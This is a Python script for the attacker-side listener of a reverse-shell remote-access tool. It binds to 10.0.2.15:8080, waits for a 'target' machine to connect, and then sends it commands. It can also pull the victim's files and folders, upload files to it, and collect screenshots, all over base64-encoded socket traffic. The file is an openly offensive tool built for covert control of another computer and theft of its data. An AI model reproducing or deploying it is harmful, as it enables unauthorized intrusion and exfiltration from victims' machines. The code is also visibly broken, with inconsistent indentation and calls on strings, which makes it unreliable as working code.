#!/usr/bin/python
import socket
import json
import base64
import os

count = 1

def reliable_send(data):
		json_data = json.dumps(data)
		target.send(json_data)
def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue
print('Done Recv!!!')

def CreateFolder(value):
		try:
			os.mkdir(value)
			os.chdir(value)
			print('Folder Created')
			reliable_send('inside')
		except:
			print('Folder Exsist')
			os.chdir(value)
			reliable_send('skip')

def RecivingFile(name):
	   path = os.getcwd()
       if name in os.listdir(path):
			reliable_send('skip')
			print('skipped')
		elif '.' not in name():
			CreateFolder(name)
		elif name == 'DoneLoop':
			os.chdir('../')
			print(os.getcwd())
		else:
				reliable_send('gotname')
				with open(name, "wb") as file:
					print('loading...')
					result = reliable_recv()
					file.write(base64.b64decode(result))
					reliable_send('gotall')


def shell():
	global count
	while True:
		command = raw_input("* Shell#~%s: " % str(ip))
		reliable_send(command)
		if command == "q":
			break
		elif command[:2] == "cd" and len(command[3:]) > 1:
			continue
		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				print('Loading...')
				result = reliable_recv()
				file.write(base64.b64decode(result))

		elif command[:3] == "lcd":
			try:
				os.chdir(command[4:])
				print(os.getcwd())
			except:
				print(os.getcwd())

		elif command[:6] == "folder":
				CreateFolder(command[7:])
				while True:	
					name = reliable_recv()
					if name == 'done':
						break
					else:
						RecivingFile(name)
	            print('DoneAll!!!')	
			

		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin:
					x = base64.b64encode(fin.read()).decode()
					reliable_send(x)
					print('Loading...')
					print(reliable_recv())
			except:
				failed = "Fail to Upload"
				print(failed)
				reliable_send(base64.b64encode(failed))
		elif command[:11] == "screenshoot":
				with open("screenshot%d" % count, "wb") as screen:
					image = reliable_recv()
					image_decoded = base64.b64decode(image)
					if image_decoded[:4] == "[!!]":
						print(image_decoded)
					else:
						screen.write(image_decoded)
						count += 1


		else: 
			result = reliable_recv()
			print(result)

def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("10.0.2.15",8080))
	s.listen(5)
	print("Listening for Incoming connecions")
	target, ip = s.accept()
	print("Target Connected")

server()
shell()
print('closeconnection')
s.close()
